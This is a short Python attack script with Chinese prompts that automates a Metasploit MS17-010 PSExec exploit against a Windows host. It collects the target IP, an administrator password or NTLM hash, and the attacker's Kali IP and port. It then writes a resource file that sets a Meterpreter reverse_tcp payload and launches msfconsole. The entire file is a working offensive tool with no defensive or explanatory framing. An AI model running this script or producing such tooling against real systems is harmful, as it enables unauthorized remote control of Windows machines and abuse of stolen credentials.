#!/usr/bin/env python3
import os

def generate_msf_script(target_ip, username, password, lhost, lport):
    """ 生成 Metasploit 资源脚本 """
    script = f"""
use exploit/windows/smb/ms17_010_psexec
set RHOSTS {target_ip}
set SMBDomain .
set SMBUser {username}
set SMBPass {password}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
    """
    with open("ms17_010_psexec.rc", "w") as f:
        f.write(script)

def main():
    print("[+] 自动化 MS17-010 PSEXEC 攻击")

    # 用户输入信息
    target_ip = input("[?] 目标 IP: ").strip()
    username = input("[?] 目标 Windows 管理员用户名 (默认: Administrator): ").strip() or "Administrator"
    auth_type = input("[?] 认证方式 (1: 密码, 2: NTLM 哈希): ").strip()

    if auth_type == "1":
        password = input("[?] 请输入管理员密码: ").strip()
    elif auth_type == "2":
        password = input("[?] 请输入 NTLM 哈希 (格式: LMHASH:NTHASH): ").strip()
    else:
        print("[-] 认证方式无效，退出。")
        return

    lhost = input("[?] 你的 Kali IP: ").strip()
    lport = input("[?] 监听端口 (默认: 4444): ").strip() or "4444"

    # 生成 Metasploit 资源脚本
    generate_msf_script(target_ip, username, password, lhost, lport)

    # 运行 Metasploit
    print("[+] 启动 Metasploit，执行攻击...")
    os.system("msfconsole -r ms17_010_psexec.rc")

if __name__ == "__main__":
    main()

